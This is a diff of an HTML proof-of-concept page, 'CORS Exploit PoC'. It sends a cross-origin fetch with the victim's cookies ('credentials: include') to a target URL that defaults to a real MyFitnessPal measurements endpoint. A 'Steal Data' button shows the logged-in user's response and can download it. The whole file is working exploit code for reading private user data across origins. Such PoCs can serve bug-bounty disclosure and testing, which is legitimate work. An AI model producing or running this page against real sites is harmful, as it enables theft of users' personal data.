@@ -1,25 +1,137 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>CORS Exploit PoC</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 2rem; line-height: 1.4; }
+    .row { display: flex; gap: .75rem; margin-bottom: 1rem; flex-wrap: wrap; }
+    input, button { font-size: 14px; padding: .6rem .8rem; }
+    input[type="text"] { min-width: 520px; max-width: 100%; }
+    button { cursor: pointer; }
+    .ok { color: #0a7a0a; font-weight: 600; }
+    .bad { color: #b00020; font-weight: 600; }
+    pre { background:#f6f8fa; padding:1rem; border:1px solid #e5e7eb; border-radius:8px; overflow:auto; max-height:60vh; }
+    small { color:#555; }
+  </style>
+</head>
 <body>
-  <h2>CORS Exploit PoC</h2>
-  <button onclick="attack()">Steal Data</button>
-  <pre id="output"></pre>
+  <h1>CORS Exploit PoC</h1>
+  <p>Open this page on any origin you control. While logged into the target in another tab, click “Steal Data”.</p>
+
+  <div class="row">
+    <input id="url" type="text" placeholder="https://www.myfitnesspal.com/measurements/check-in.json"
+           value="TARGET_URL" />
+    <button id="go">Steal Data</button>
+    <button id="download" disabled>Download Response</button>
+  </div>
+
+  <div class="row">
+    <label><input id="asJson" type="checkbox" checked /> Pretty-print JSON</label>
+    <label><input id="forceCors" type="checkbox" /> Force preflight (adds custom header)</label>
+  </div>
+
+  <div id="status"><small>Idle.</small></div>
+  <h3>Response</h3>
+  <pre id="out">(no data)</pre>
 
   <script>
-    async function attack() {
-      try {
-        const res = await fetch("https://www.myfitnesspal.com/measurements/check-in.json", {
-  method: "GET",
-  credentials: "include"
-});
+    const $ = (sel) => document.querySelector(sel);
+    const urlEl = $("#url");
+    const outEl = $("#out");
+    const statusEl = $("#status");
+    const goBtn = $("#go");
+    const dlBtn = $("#download");
+    const asJsonEl = $("#asJson");
+    const forceCorsEl = $("#forceCors");
 
+    let lastText = "";
+
+    function setStatus(msg, ok=false, bad=false) {
+      statusEl.innerHTML = `<span class="${ok ? 'ok' : bad ? 'bad' : ''}">${msg}</span>`;
+    }
+
+    async function attack() {
+      const url = urlEl.value.trim();
+      if (!/^https?:\/\//i.test(url)) {
+        setStatus("Please provide a full https:// URL.", false, true);
+        return;
+      }
+
+      setStatus("Sending cross-origin request with credentials…");
+      outEl.textContent = "(waiting…)";
+      dlBtn.disabled = true;
+      lastText = "";
+
+      const init = {
+        method: "GET",
+        // Critical: send victim cookies
+        credentials: "include",
+        // mode 'cors' is default for cross-origin fetch, set explicitly for clarity
+        mode: "cors",
+        headers: {}
+      };
+
+      // Add a harmless custom header to trigger preflight if you want to show AC headers behavior
+      if (forceCorsEl.checked) {
+        init.headers["X-PoC"] = "cors-test";
+      }
+
+      const t0 = performance.now();
+      try {
+        const res = await fetch(url, init);
+
+        // Note: JS can only read certain headers if the server exposes them via
+        // Access-Control-Expose-Headers. Lack of access here is itself a signal.
+        const t1 = performance.now();
+        const elapsed = (t1 - t0).toFixed(0);
+
+        // If CORS failed before network completes, many browsers throw; if we got here, CORS likely allowed the response.
+        // Still, some failures appear as opaque responses; check type/status.
+        if (res.type === "opaque") {
+          setStatus(`Received opaque response after ${elapsed} ms (CORS blocked read).`, false, true);
+          outEl.textContent = "Opaque response: the browser blocked access to the body. Likely non-exploitable.";
+          return;
+        }
+
+        // Attempt to read text regardless of content-type
         const text = await res.text();
-        document.getElementById("output").innerText = text;
+        lastText = text;
+
+        // Try to pretty-print JSON if requested and parseable
+        let display = text;
+        if (asJsonEl.checked) {
+          try {
+            const json = JSON.parse(text);
+            display = JSON.stringify(json, null, 2);
+          } catch (_) { /* not JSON, show raw */ }
+        }
+
+        const ok = res.ok;
+        setStatus(`${ok ? "SUCCESS" : "HTTP " + res.status} after ${elapsed} ms — response body accessible cross-origin.`, ok, !ok);
+        outEl.textContent = display || "(empty body)";
+        dlBtn.disabled = !text;
       } catch (err) {
-        document.getElementById("output").innerText = "Error: " + err;
+        // Most common when CORS blocks: TypeError: Failed to fetch
+        setStatus(`Fetch failed: ${err}`, false, true);
+        outEl.textContent = `Likely blocked by CORS (no readable response). Details:\n\n${String(err.stack || err)}`;
       }
     }
+
+    function downloadText() {
+      const blob = new Blob([lastText], { type: "text/plain" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "cors-response.txt";
+      document.body.appendChild(a);
+      a.click();
+      URL.revokeObjectURL(a.href);
+      a.remove();
+    }
+
+    goBtn.addEventListener("click", attack);
+    dlBtn.addEventListener("click", downloadText);
   </script>
 </body>
 </html>
-
